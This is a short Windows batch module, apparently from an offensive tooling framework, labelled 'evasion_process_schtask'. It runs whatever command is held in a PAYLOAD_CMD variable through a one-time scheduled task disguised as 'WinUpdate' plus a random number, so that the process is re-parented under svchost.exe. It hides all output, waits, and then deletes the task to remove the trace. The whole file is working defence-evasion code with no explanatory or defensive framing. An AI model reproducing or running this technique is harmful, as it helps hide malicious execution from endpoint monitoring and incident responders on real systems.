REM provides: evasion_process_schtask
REM depends: (none)
REM description: Execute via scheduled task to re-parent process under svchost.exe

REM Generate random task name to avoid collisions
set "TNAME=WinUpdate%RANDOM%"

REM Create immediate one-time task
if defined PAYLOAD_CMD (
    schtasks /create /tn "%TNAME%" /tr "cmd /c %PAYLOAD_CMD%" /sc once /st 00:00 /f >nul 2>nul
    schtasks /run /tn "%TNAME%" >nul 2>nul
)

REM Wait for task execution
ping -n 5 127.0.0.1 >nul 2>nul

REM Clean up the task
schtasks /delete /tn "%TNAME%" /f >nul 2>nul
